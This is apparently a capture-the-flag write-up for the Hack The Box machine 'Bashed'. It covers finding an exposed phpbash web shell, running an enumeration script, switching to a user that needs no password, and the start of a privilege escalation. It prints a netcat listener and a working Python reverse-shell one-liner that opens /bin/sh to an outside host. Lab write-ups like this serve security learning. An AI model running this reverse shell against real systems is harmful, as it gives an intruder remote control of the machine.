## Reco

Time to scan, for this one i used ZenMap :

We find the port 80, let's check it out.

The site looks like a presentation for a Reverse Shell in PHP, their is also a link for it on GitHub.

The tool is name "phpbash.php", it might be present on the website, who knows ?

Let's try the same URL as shown in GitHub: http://10.10.10.68/upload/phpbash.php 

ahh nothing

Time To dirb !

Ok we found it ! http://10.10.10.68/dev/phpbash.php

So, i guess we have a reverse shell already?

Lets upload LineNum.sh to get some informations.

## Exploit

Ok so this mean we can su to scriptmanager without a password, thats great ! 

![alt text](/assets/images/bashed/userflag.png?raw=true "flag")

And we own the user :)

phpbash does not have a lot of permission so it's time to get a proper REshell.

For this one i'm using nc for the server : 

```bash
nc -nvlp 1234 
```

and python for the client : 

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

No its time to privesc, lets check out some linux stuff.

We can see a directory name scripts at the root that contain a basic python script wich is executed 
regularly and got root privileges.
